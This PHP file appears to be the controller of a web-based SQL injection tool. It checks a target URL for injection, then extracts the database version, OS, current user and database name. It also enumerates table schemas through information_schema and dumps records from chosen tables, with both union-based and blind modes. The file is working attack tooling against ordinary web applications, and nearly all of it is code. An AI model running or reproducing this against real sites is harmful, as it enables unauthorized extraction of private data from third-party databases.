<?php
session_start();
require_once 'inc/injbot.class.php';
require_once 'inc/injbot.function.php';

if ( (!isset($_POST["scan"]) && !isset($_POST["url"])) || (isset($_POST["scan"]) && empty($_POST["url"])) ) {
    _print();
    exit;
} elseif ($_POST['select_attack'] != 'test' && !isset($_SESSION['scanner'])) {
    _print(" Scan the target first..");
    exit;
} elseif (isset($_POST["close"])) {
    session_destroy();
    _print(" Profile cleared..");
    exit;
}
//============== Scan OPTION =================
isset($_POST["select_attack"]) ? $option = $_POST['select_attack'] : $option = "";

switch ($option) {

    case "test":
        $timer = microtime(true);
        if (isset($_SESSION["target"])) {
            _print(" Already scanned..");
            exit;
        }
        
        $target = new TargetServer((array)$_POST["url"]);
        $scanner = new Scanner($target);
        $isVuln = $scanner->check_vuln();

        $_SESSION["target"] = serialize($target);
        $_SESSION["scanner"] = serialize($scanner);
        if ($isVuln == false) {
            session_destroy();
            _print(" Target may not be vulnerable!");
            exit;
        }
        $stop = round(microtime(true) - $timer,2);
        _print(" Vulnerable.. Elapsed time (".$stop." sec)");
        exit;

//========== Database Info OPTION ===========

#| version                                    | 8.0.12                       |
#| version_comment                            | MySQL Community Server - GPL |
#| version_compile_machine                    | x86_64                       |
#| version_compile_os                         | Linux

    case "dbinfo":
        $timer = microtime(true);
        $msg = " Fetching database info...";
        $target = unserialize($_SESSION["target"]);
        $scanner = unserialize($_SESSION["scanner"]);
        $sep = str_repeat($scanner->sep, 2);
        $payload = "mid(@@GLOBAL.version,1,1),@@GLOBAL.version_comment,@@GLOBAL.version_compile_os,database(),user()";
        try {
            if (!isset($_POST['blindOn'])) {
                $dbinfo = $scanner->get_exploit($payload);
                $dbinfo = explode($sep, $dbinfo);
            } else { # Blind is selected
                $dbinfo = $scanner->get_records("", $payload, 1);
                $dbinfo = explode($scanner->sep, $dbinfo[0]);
/*                 $dbinfo[0] = $scanner->blind_fetch("@@GLOBAL.version");
                $dbinfo[1] = $scanner->blind_fetch("@@GLOBAL.version_comment");
                $dbinfo[2] = $scanner->blind_fetch("@@GLOBAL.version_compile_os");
                $dbinfo[3] = $scanner->blind_fetch("database()");
                $dbinfo[4] = $scanner->blind_fetch("user()"); */
            }
            $target->set_dbInfo($dbinfo);
            $result="<tr><td>| Version<td> | ".$dbinfo[0];
            $result.="<tr><td>| Database<td> | ".$dbinfo[3];
            $result.="<tr><td>| User<td> | ".$dbinfo[4];
            $result.="<tr><td>| Operating System<td> | ".$dbinfo[1].$dbinfo[2];
            $_SESSION["target"] = serialize($target);
            $_SESSION["scanner"] = serialize($scanner);
        } catch(Exception $e) {
            _print("Cannot fetch database information..");
        }
        $stop = round(microtime(true) - $timer,2);
        _print($msg." Elapsed time (".$stop." sec)",$result);
        exit;

//============== [All DBs] Fetch Schemas OPTION =================
    case "fschem":
        $timer = microtime(true);
        $target = unserialize($_SESSION["target"]);
        $scanner = unserialize($_SESSION["scanner"]);

        if (!isset($target->tblCount)) {
            $tblCount = $scanner->get_exploit("count(table_name)", "information_schema.tables");
            $scanner->site->set_tblCount((int)$tblCount[0]);
        }

        $msg = " Trying to get table schemas..";
        $result = "";
        if (!isset($_POST['blindOn'])) {
            $tblSchemas = $scanner->get_exploit("concat(table_name,column_name)", "information_schema.columns", "table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()", true);
            $scanner->site->set_tblSchemas($tblSchemas);
            if (empty($tblSchemas)) {
                _print(" Failed to get any schemas..");
                exit;
            }
            
            foreach ($tblSchemas as $tKey => $tblSchema) {
                $result .= "<thead><tr><th class='first-th'>$tKey</th></tr></thead>";
                foreach ($tblSchema as $cKey => $colSchema) {
                    $result .= "<tr><td class='first-td'>$colSchema";
                }
            }
        } else {
            $tblSchemas = $scanner->blind_fetch();
            if ($tblSchemas == false) {
                _print(" Failed to get any schemas..");
                exit;
            } else {
                foreach ($tblSchemas as $tKey => $tblSchema) {
                    $result .= "<thead><tr><th class='first-th'>$tKey</th></tr></thead>";
                    foreach ($tblSchema as $cKey => $colSchema) {
                        $result .= "<tr><td class='first-td'>$colSchema";
                    }
                }
            }
        }
        if ($tblSchemas) {
            $target->set_tblSchemas($tblSchemas);
            $_SESSION["target"] = serialize($target);
            $_SESSION["scanner"] = serialize($scanner);
       	    $stop = round(microtime(true) - $timer,2);
            _print($msg." Elapsed time (".$stop." sec)", $result);
        }
        exit;

    case "recrd":
        $timer = microtime(true);

        if (empty($_POST["tbl_select"])) {
            _print(" Select 'Fetch schemas' first..");
            exit;
        }
        $tblName = $_POST["tbl_select"];
        $rowsNo = (int)$_POST["rows_no"];
        $target = unserialize($_SESSION["target"]);
        $scanner = unserialize($_SESSION["scanner"]);
        $scanner->site->set_rowsCount($rowsNo);
        $msg = " Fetching '$tblName' records..";
        $colsNo = sizeof($target->tblSchemas[$tblName]);
        $result = "<thead><tr>";
        if (!isset($_POST["blindOn"])) {
            $colNames = implode(",", $target->tblSchemas[$tblName]);
            $recordsData = $scanner->get_exploit($colNames, $tblName);
            foreach ($target->tblSchemas[$tblName] as $i => $col) {
                $result .= "<th>$col";
            }
            $result .= "</th></thead>";
            foreach ($recordsData[$tblName] as $cKey => $cols) {
                $result .= "<tr>";
                foreach ($cols as $key => $col) {
                    strlen($col) > 41 ? $col = substr($col, 0, 41)."..." : $col;
                    $result .= "<td>".$col;
                }
            }
        } else {
            # build array like with column name as its chars length, ie array("id" => 2, "uname" => 5...)
            $columns = implode(",", $target->tblSchemas[$tblName]);
            $gemsData = $scanner->get_records($tblName, $columns, $rowsNo);
            foreach ($gemsData as $rKey => $cellData) {
                $recordsData[$rKey] = implode(array_map("chr", $cellData));
                $recordsData[$rKey] = explode($scanner->sep, $recordsData[$rKey]);
                $recordsData[$rKey] = array_combine($target->tblSchemas[$tblName], $recordsData[$rKey]);
                $result .= "<tr>";
                foreach ($recordsData[$rKey] as $key => $record) {
                    $result.="<td>".$record;
                }
            }
        }
        $stop = round(microtime(true) - $timer,2);
        isset($recordsData) ? _print($msg." Elapsed time (".$stop." sec)", $result) : _print(" Cannot get any record..");
        exit;
}
